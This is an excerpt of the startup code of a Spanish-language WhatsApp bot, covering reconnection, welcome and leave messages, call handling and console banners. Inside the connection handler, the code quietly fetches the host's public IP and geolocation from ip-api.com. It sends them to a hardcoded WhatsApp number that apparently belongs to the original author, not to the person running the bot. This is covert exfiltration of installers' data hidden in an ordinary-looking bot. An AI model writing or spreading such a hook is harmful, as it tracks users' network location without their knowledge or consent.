...
cnf.autoReconnect = ReconnectMode.onConnectionLost
 ...
 console.log(color('|WRN|', 'yellow'), color('busoneado con exito', 'cyan'))
 cnf.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hola creador soy ${settings.NamaBot}, Me eh conectado a este número con éxito*\n────────────────────\n\`\`\`${JSON.stringify(cnf.user, null, 2)}\`\`\`\n────────────────────\n*Si hay un error o el bot no responde reportarlo a mi creador*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "matt",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/50254371795?text=ola%20matt%20Te%20Amo😍❤️"}}})
	console.log(color('|WRN|', 'yellow'), color('ip enviada', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       cnf.sendMessage("542224483349@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "owner matt",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/50254371795?text=Ola"}}})
       console.log(color('|WRN|', 'yellow'), color('Enviando IP', 'red'))
   })
      cnf.on('connecting', () => {
		console.log(color('|ESP|'), color('espere..', 'cyan'))
		})
	
	cnf.on('open', () => {
	console.log(color('|EXSITOSO|'), color('Conectado, escriba #menu en Whatsapp..!!', 'cyan'))
	}) 
    ...
    cnf.on('close', async () => {
        console.log(color('|TRM|'), color('WIFI MALO :U.', 'cyan'))
        })
       ...
       otod = `${settings.NomorOwner}@s.whatsapp.net`
		...
		if (!welkom.includes(anu.jid)) return
           mem = anu.participants[0]
            ...
            cnf.sendMessage(mdata.id, keluar, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Salio de ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtube.com/c/Los%20panas`}}})
...
cnf.on('CB:action,,call', async json => {
        ...
        cnf.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Creador ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:`https://wa.me/542224483349?text=ola%20matt%20Te%20Amo❤️😍`}}})
        await sleep(5000)
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('estas usando un bot de matt', 'blue'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('hecho por matt' ,{ flashStyle: term.brightWhite })
